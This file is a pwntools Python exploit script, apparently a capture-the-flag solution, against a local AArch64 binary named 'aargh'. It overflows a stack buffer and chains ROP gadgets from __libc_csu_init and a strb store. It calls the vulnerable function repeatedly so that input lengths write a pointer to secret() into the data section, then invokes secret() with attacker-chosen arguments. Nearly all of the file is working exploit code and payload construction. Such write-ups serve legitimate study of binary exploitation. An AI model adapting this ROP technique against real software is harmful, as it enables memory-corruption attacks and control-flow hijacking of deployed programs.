from pwn import *

r = process("./aargh")

"""
========== Exploitation idea ==========
- construct a pointer to secret in data section
    - w0 control: call "vuln" and enter the number of bytes wanted to stdin
    - x19 control with "ldr x19, [sp, #16]"
    - strb w0, [x19, #0x40]

- store data address in x21, set x19 to 0 (csu_init_ldp)
- store parameters in x22, x23 and x24
- call secret (csu_init_ldr)

"""

csu_init_ldp = p64(0x4007c8) # ldp x19, x20, [sp, #16] ; ldp x21, x22, [sp, #32] ; ldp x23, x24, [sp, #48] ; ldp x29, x30, [sp], #64 ; ret
csu_init_ldr = p64(0x4007a8) # ldr x3, [x21, x19, lsl #3] ; mov x2, x24 ; add x19, x19, #0x1 ; mov x1, x23 ; mov w0, w22 ; blr x3
strb_w0_x19  = p64(0x400650) # strb w0, [x19, #0x40] ; ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
ldr_x19_sp16 = p64(0x400654) #                         ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
ldp_x29_x39  = p64(0x400658) #                                                ldp x29, x30, [sp], #0x20 ; ret
vuln_func    = p64(0x4006fc + 8) # vuln(), skipping stack frame preservation

data_addr    = 0x411030
# secret() addr: 0x400664 --> 0x64, 0x06, 0x40
PADDING_8 = b"BBBBBBBB"

rop = b"A" * 264

# Payload to construct a pointer in data section
## Store 1st byte
rop += vuln_func
rop += PADDING_8

rop += ldr_x19_sp16
rop += b"B" * 256
rop += PADDING_8                  # x29
rop += strb_w0_x19                # x30
rop += p64(data_addr - 0x40)      # x19
rop += PADDING_8 * 2

## Store 2nd byte
rop += vuln_func
rop += PADDING_8 * 3

rop += ldr_x19_sp16
rop += b"B" * 256
rop += PADDING_8                  # x29
rop += strb_w0_x19                # x30
rop += p64(data_addr - 0x40 + 1)  # x19
rop += PADDING_8 * 2

## Store 3rd byte
rop += vuln_func
rop += PADDING_8 * 3

rop += ldr_x19_sp16
rop += b"B" * 256
rop += PADDING_8                  # x29
rop += strb_w0_x19                # x30
rop += p64(data_addr - 0x40 + 2)  # x19
rop += PADDING_8 * 2


# Final payload to call secret()
rop += csu_init_ldp
rop += PADDING_8 * 2
rop += PADDING_8    # x29 --> FP (Frame Pointer)
rop += csu_init_ldr # x30 --> LR (Procedure Link Register)

rop += p64(0)  # 0x19
rop += p64(1)  # 0x20

rop += p64(data_addr)   # 0x21 --> pointer to secret() function
rop += p64(0xDEADBEEF)  # 0x22

rop += p64(0xCAFEBABE900DF00D) # 0x23
rop += p64(0xFEEDBABEBAADF00D) # 0x24

log.info(f"ROPchain size: {len(rop)} bytes")

# pause()
r.sendlineafter(b"secret? ", rop)
r.sendlineafter(b"secret? ", b"0" * (0x64 - 1))
r.sendlineafter(b"secret? ", b"1" * (0x06 - 1))
r.sendlineafter(b"secret? ", b"2" * (0x40 - 1))

# r.interactive()
log.success(r.recvall().decode())
